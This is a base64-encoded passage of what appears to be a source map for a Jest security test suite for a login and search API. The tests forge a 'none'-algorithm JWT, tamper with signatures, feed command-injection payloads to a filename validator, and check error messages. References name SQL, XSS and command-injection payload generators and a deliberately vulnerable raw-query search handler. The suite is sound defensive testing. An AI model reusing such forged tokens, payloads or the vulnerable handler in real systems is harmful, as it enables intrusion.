4nLCB7XG4gICAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgICAgYm9keToge1xuICAgICAgICAgICAgZW1haWw6IGlucHV0LFxuICAgICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgICAgfSxcbiAgICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICAgIH0sXG4gICAgICAgIH0pO1xuXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIocmVxdWVzdCk7XG4gICAgICAgIFxuICAgICAgICBleHBlY3QocmVzcG9uc2Uuc3RhdHVzKS50b0JlKDQwMCk7XG4gICAgICB9XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdDb21tYW5kIEluamVjdGlvbiBQcm90ZWN0aW9uJywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgcHJldmVudCBjb21tYW5kIGluamVjdGlvbiBpbiBmaWxlIG9wZXJhdGlvbnMnLCAoKSA9PiB7XG4gICAgICBjb25zdCBjb21tYW5kUGF5bG9hZHMgPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZUNvbW1hbmRJbmplY3Rpb25QYXlsb2FkcygpO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IHBheWxvYWQgb2YgY29tbWFuZFBheWxvYWRzKSB7XG4gICAgICAgIC8vIFNpbXVsYXRlIGZpbGUgbmFtZSB2YWxpZGF0aW9uXG4gICAgICAgIGNvbnN0IGlzVmFsaWRGaWxlTmFtZSA9IChmaWxlbmFtZTogc3RyaW5nKTogYm9vbGVhbiA9PiB7XG4gICAgICAgICAgLy8gT25seSBhbGxvdyBhbHBoYW51bWVyaWMsIGRvdHMsIGh5cGhlbnMsIGFuZCB1bmRlcnNjb3Jlc1xuICAgICAgICAgIHJldHVybiAvXlthLXpBLVowLTkuXy1dKyQvLnRlc3QoZmlsZW5hbWUpO1xuICAgICAgICB9O1xuICAgICAgICBcbiAgICAgICAgZXhwZWN0KGlzVmFsaWRGaWxlTmFtZShwYXlsb2FkKSkudG9CZShmYWxzZSk7XG4gICAgICB9XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdKV1QgU2VjdXJpdHknLCAoKSA9PiB7XG4gICAgY29uc3QgdGVzdFNlY3JldCA9ICd0ZXN0LXNlY3JldCc7XG4gICAgXG4gICAgaXQoJ3Nob3VsZCB1c2Ugc2VjdXJlIEpXVCBjb25maWd1cmF0aW9uJywgKCkgPT4ge1xuICAgICAgY29uc3QgcGF5bG9hZCA9IHsgdXNlcklkOiAxLCBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nIH07XG4gICAgICBjb25zdCBzZWNyZXQgPSAndGVzdC1zZWNyZXQnO1xuICAgICAgY29uc3QgdG9rZW4gPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZVZhbGlkSldUKHBheWxvYWQsIHNlY3JldCk7XG4gICAgICBcbiAgICAgIGNvbnN0IGRlY29kZWQgPSBqd3QudmVyaWZ5KHRva2VuLCBzZWNyZXQpIGFzIGFueTtcbiAgICAgIFxuICAgICAgZXhwZWN0KGRlY29kZWQudXNlcklkKS50b0JlKDEpO1xuICAgICAgZXhwZWN0KGRlY29kZWQuZW1haWwpLnRvQmUoJ3Rlc3RAZXhhbXBsZS5jb20nKTtcbiAgICAgIGV4cGVjdChkZWNvZGVkLmlhdCkudG9CZURlZmluZWQoKTtcbiAgICAgIGV4cGVjdChkZWNvZGVkLmV4cCkudG9CZURlZmluZWQoKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgbm90IGFjY2VwdCB0b2tlbnMgd2l0aCBub25lIGFsZ29yaXRobScsICgpID0+IHtcbiAgICAgIC8vIENyZWF0ZSBhIHRva2VuIHdpdGggJ25vbmUnIGFsZ29yaXRobSAoc2VjdXJpdHkgdnVsbmVyYWJpbGl0eSlcbiAgICAgIGNvbnN0IGhlYWRlciA9IEJ1ZmZlci5mcm9tKEpTT04uc3RyaW5naWZ5KHsgYWxnOiAnbm9uZScsIHR5cDogJ0pXVCcgfSkpLnRvU3RyaW5nKCdiYXNlNjR1cmwnKTtcbiAgICAgIGNvbnN0IHBheWxvYWQgPSBCdWZmZXIuZnJvbShKU09OLnN0cmluZ2lmeSh7IHVzZXJJZDogMSwgZW1haWw6ICd0ZXN0QGV4YW1wbGUuY29tJyB9KSkudG9TdHJpbmcoJ2Jhc2U2NHVybCcpO1xuICAgICAgY29uc3Qgbm9uZVRva2VuID0gYCR7aGVhZGVyfS4ke3BheWxvYWR9LmA7XG4gICAgICBcbiAgICAgIGV4cGVjdCgoKSA9PiB7XG4gICAgICAgIGp3dC52ZXJpZnkobm9uZVRva2VuLCB0ZXN0U2VjcmV0KTtcbiAgICAgIH0pLnRvVGhyb3coKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdmFsaWRhdGUgdG9rZW4gc2lnbmF0dXJlJywgKCkgPT4ge1xuICAgICAgY29uc3QgdmFsaWRUb2tlbiA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlVmFsaWRKV1QoeyB1c2VySWQ6IDEgfSwgdGVzdFNlY3JldCk7XG4gICAgICBjb25zdCBbaGVhZGVyLCBwYXlsb2FkLCBzaWduYXR1cmVdID0gdmFsaWRUb2tlbi5zcGxpdCgnLicpO1xuICAgICAgY29uc3QgdGFtcGVyZWRUb2tlbiA9IGAke2hlYWRlcn0uJHtwYXlsb2FkfS50YW1wZXJlZF9zaWduYXR1cmVgO1xuICAgICAgXG4gICAgICBleHBlY3QoKCkgPT4ge1xuICAgICAgICBqd3QudmVyaWZ5KHRhbXBlcmVkVG9rZW4sIHRlc3RTZWNyZXQpO1xuICAgICAgfSkudG9UaHJvdygnaW52YWxpZCBzaWduYXR1cmUnKTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ1JhdGUgTGltaXRpbmcgU2ltdWxhdGlvbicsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIGhhbmRsZSByYXBpZCBzdWNjZXNzaXZlIHJlcXVlc3RzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgcmVxdWVzdHMgPSBBcnJheS5mcm9tKHsgbGVuZ3RoOiAxMDAgfSwgKCkgPT4gXG4gICAgICAgIGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICAgIGJvZHk6IHtcbiAgICAgICAgICAgIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScsXG4gICAgICAgICAgICBwYXNzd29yZDogJ3Bhc3N3b3JkMTIzJyxcbiAgICAgICAgICB9LFxuICAgICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgICAgICAnWC1Gb3J3YXJkZWQtRm9yJzogJzE5Mi4xNjguMS4xMDAnLFxuICAgICAgICAgIH0sXG4gICAgICAgIH0pXG4gICAgICApO1xuXG4gICAgICAvLyBJbiBhIHJlYWwgaW1wbGVtZW50YXRpb24sIHRoaXMgd291bGQgdHJpZ2dlciByYXRlIGxpbWl0aW5nXG4gICAgICBjb25zdCByZXNwb25zZXMgPSBhd2FpdCBQcm9taXNlLmFsbChcbiAgICAgICAgcmVxdWVzdHMubWFwKHJlcSA9PiBzZWN1cmVBdXRoSGFuZGxlcihyZXEpKVxuICAgICAgKTtcblxuICAgICAgLy8gQWxsIHJlcXVlc3RzIHNob3VsZCBiZSBwcm9jZXNzZWQgKGluIHJlYWwgYXBwLCBzb21lIHdvdWxkIGJlIHJhdGUgbGltaXRlZClcbiAgICAgIHJlc3BvbnNlcy5mb3JFYWNoKHJlc3BvbnNlID0+IHtcbiAgICAgICAgZXhwZWN0KFs0MDAsIDQwMSwgNDI5XSkudG9Db250YWluKHJlc3BvbnNlLnN0YXR1cyk7IC8vIDQyOSA9IFRvbyBNYW55IFJlcXVlc3RzXG4gICAgICB9KTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0Vycm9yIEhhbmRsaW5nIFNlY3VyaXR5JywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgbm90IGV4cG9zZSBzZW5zaXRpdmUgaW5mb3JtYXRpb24gaW4gZXJyb3IgbWVzc2FnZXMnLCBhc3luYyAoKSA9PiB7XG4gICAgICAvLyBTaW11bGF0ZSBkYXRhYmFzZSBlcnJvclxuICAgICAgbW9ja1ByaXNtYS51c2VyLmZpbmRVbmlxdWUubW9ja1JlamVjdGVkVmFsdWUobmV3IEVycm9yKCdDb25uZWN0aW9uIGZhaWxlZCB0byBkYXRhYmFzZSBcIm1kX3Nwb3J0c1wiIG9uIGhvc3QgXCJsb2NhbGhvc3RcIicpKTtcbiAgICAgIFxuICAgICAgY29uc3QgcmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgYm9keToge1xuICAgICAgICAgIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScsXG4gICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgIH0sXG4gICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICB9LFxuICAgICAgfSk7XG5cbiAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIocmVxdWVzdCk7XG4gICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpO1xuICAgICAgXG4gICAgICBleHBlY3QocmVzcG9uc2Uuc3RhdHVzKS50b0JlKDUwMCk7XG4gICAgICBleHBlY3QoZGF0YS5lcnJvcikudG9CZSgnSW50ZXJuYWwgc2VydmVyIGVycm9yJyk7XG4gICAgICBleHBlY3QoZGF0YS5lcnJvcikubm90LnRvQ29udGFpbignZGF0YWJhc2UnKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS5ub3QudG9Db250YWluKCdsb2NhbGhvc3QnKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS5ub3QudG9Db250YWluKCdtZF9zcG9ydHMnKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdXNlIGdlbmVyaWMgZXJyb3IgbWVzc2FnZXMgZm9yIGF1dGhlbnRpY2F0aW9uIGZhaWx1cmVzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgbW9ja1ByaXNtYS51c2VyLmZpbmRVbmlxdWUubW9ja1Jlc29sdmVkVmFsdWUobnVsbCk7XG4gICAgICBcbiAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgIGJvZHk6IHtcbiAgICAgICAgICBlbWFpbDogJ25vbmV4aXN0ZW50QGV4YW1wbGUuY29tJyxcbiAgICAgICAgICBwYXNzd29yZDogJ3Bhc3N3b3JkMTIzJyxcbiAgICAgICAgfSxcbiAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgIH0sXG4gICAgICB9KTtcblxuICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7XG4gICAgICBcbiAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLnRvQmUoNDAxKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS50b0JlKCdJbnZhbGlkIGNyZWRlbnRpYWxzJyk7XG4gICAgICBleHBlY3QoZGF0YS5lcnJvcikubm90LnRvQ29udGFpbigndXNlciBub3QgZm91bmQnKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS5ub3QudG9Db250YWluKCdlbWFpbCcpO1xuICAgIH0pO1xuICB9KTtcbn0pOyJdLCJuYW1lcyI6WyJOZXh0UmVzcG9uc2UiLCJqc29uIiwiZGF0YSIsImluaXQiLCJzdGF0dXMiLCJoZWFkZXJzIiwiSGVhZGVycyIsInJlZGlyZWN0IiwidXJsIiwiTG9jYXRpb24iLCJjcmVhdGVNb2NrTmV4dFJlcXVlc3QiLCJvcHRpb25zIiwibWV0aG9kIiwiYm9keSIsIkpTT04iLCJwYXJzZSIsInRleHQiLCJzdHJpbmdpZnkiLCJTZWN1cml0eVRlc3RVdGlscyIsImdlbmVyYXRlU1FMSW5qZWN0aW9uUGF5bG9hZHMiLCJnZW5lcmF0ZVhTU1BheWxvYWRzIiwiZ2VuZXJhdGVDb21tYW5kSW5qZWN0aW9uUGF5bG9hZHMiLCJnZW5lcmF0ZUxvbmdTdHJpbmdzIiwicmVwZWF0IiwiZ2VuZXJhdGVJbnZhbGlkVG9rZW5zIiwiaGFzaFBhc3N3b3JkIiwicGFzc3dvcmQiLCJiY3J5cHQiLCJoYXNoIiwiZ2VuZXJhdGVWYWxpZEpXVCIsInBheWxvYWQiLCJzZWNyZXQiLCJqd3QiLCJzaWduIiwiZXhwaXJlc0luIiwiZ2VuZXJhdGVFeHBpcmVkSldUIiwibW9ja1ByaXNtYSIsInVzZXIiLCJmaW5kVW5pcXVlIiwiamVzdCIsImZuIiwiZmluZE1hbnkiLCJjcmVhdGUiLCJ1cGRhdGUiLCJwcm9kdWN0IiwiJHF1ZXJ5UmF3IiwiJGV4ZWN1dGVSYXciLCJ2dWxuZXJhYmxlU2VhcmNoSGFuZGxlciIsInJlcSIsIlVSTCIsInF1ZXJ5Iiwic2VhcmNoUGFyYW1zIiwiZ2V0IiwiZXJyb3IiLCJyZXN1bHRzIiwic2VjdXJlU2VhcmNoSGFuZGxlciIsImxlbmd0aCIsInNhbml0aXplZFF1ZXJ5IiwicmVwbGFjZSIsIndoZXJlIiwibmFtZSIsImNvbnRhaW5zIiwibW9kZSIsInNlY3VyZUF1dGhIYW5kbGVyIiwiZW1haWwiLCJjbGllbnRJUCIsImVtYWlsUmVnZXgiLCJoYXNDb250cm9sQ2hhcnMiLCJ0ZXN0IiwiaGFzQ29uc2VjdXRpdmVEb3RzIiwic3VzcGljaW91c1BhdHRlcm5zIiwiaXNTdXNwaWNpb3VzIiwic29tZSIsInBhdHRlcm4iLCJQcm9taXNlIiwicmVzb2x2ZSIsInNldFRpbWVvdXQiLCJpc1ZhbGlkIiwiY29tcGFyZSIsInRva2VuIiwidXNlcklkIiwiaWQiLCJpYXQiLCJNYXRoIiwiZmxvb3IiLCJEYXRlIiwibm93IiwiaXNzdWVyIiwiYXVkaWVuY2UiLCJkZXNjcmliZSIsImJlZm9yZUFsbCIsInByb2Nlc3MiLCJlbnYiLCJKV1RfU0VDUkVUIiwiYmVmb3JlRWFjaCIsImNsZWFyQWxsTW9ja3MiLCJpdCIsInNxbFBheWxvYWRzIiwicmVxdWVzdCIsImVuY29kZVVSSUNvbXBvbmVudCIsInJlc3BvbnNlIiwiZXhwZWN0Iiwibm90IiwidG9CZSIsInRvSGF2ZVByb3BlcnR5IiwibW9ja1Jlc29sdmVkVmFsdWUiLCJ0b0hhdmVCZWVuQ2FsbGVkV2l0aCIsInhzc1BheWxvYWRzIiwicmVzcG9uc2VTdHIiLCJ0b01hdGNoIiwidGVzdFNlY3JldCIsImludmFsaWRUb2tlbnMiLCJ2ZXJpZnkiLCJ0b1Rocm93IiwiZXhwaXJlZFRva2VuIiwiaXNJbnZhbGlkIiwidmFsaWRFbWFpbCIsImludmFsaWRFbWFpbCIsIm1vY2tJbXBsZW1lbnRhdGlvbiIsInZhbGlkUmVxdWVzdCIsImludmFsaWRSZXF1ZXN0Iiwic3RhcnQxIiwicmVzcG9uc2UxIiwidGltZTEiLCJzdGFydDIiLCJyZXNwb25zZTIiLCJ0aW1lMiIsImFicyIsInRvQmVMZXNzVGhhbiIsImxvbmdTdHJpbmdzIiwibG9uZ1N0cmluZyIsImludmFsaWRFbWFpbHMiLCJlbXB0eUVtYWlsUmVxdWVzdCIsImVtcHR5RW1haWxSZXNwb25zZSIsImVtcHR5RW1haWxEYXRhIiwibWFsaWNpb3VzSW5wdXRzIiwiaW5wdXQiLCJjb21tYW5kUGF5bG9hZHMiLCJpc1ZhbGlkRmlsZU5hbWUiLCJmaWxlbmFtZSIsImRlY29kZWQiLCJ0b0JlRGVmaW5lZCIsImV4cCIsImhlYWRlciIsIkJ1ZmZlciIsImZyb20iLCJhbGciLCJ0eXAiLCJ0b1N0cmluZyIsIm5vbmVUb2tlbiIsInZhbGlkVG9rZW4iLCJzaWduYXR1cmUiLCJzcGxpdCIsInRhbXBlcmVkVG9rZW4iLCJyZXF1ZXN0cyIsIkFycmF5IiwicmVzcG9uc2VzIiwiYWxsIiwibWFwIiwiZm9yRWFjaCIsInRvQ29udGFpbiIsIm1vY2tSZWplY3RlZFZhbHVlIiwiRXJyb3IiXSwibWFwcGluZ3MiOiI7Ozs7eUJBQXNFO3FFQU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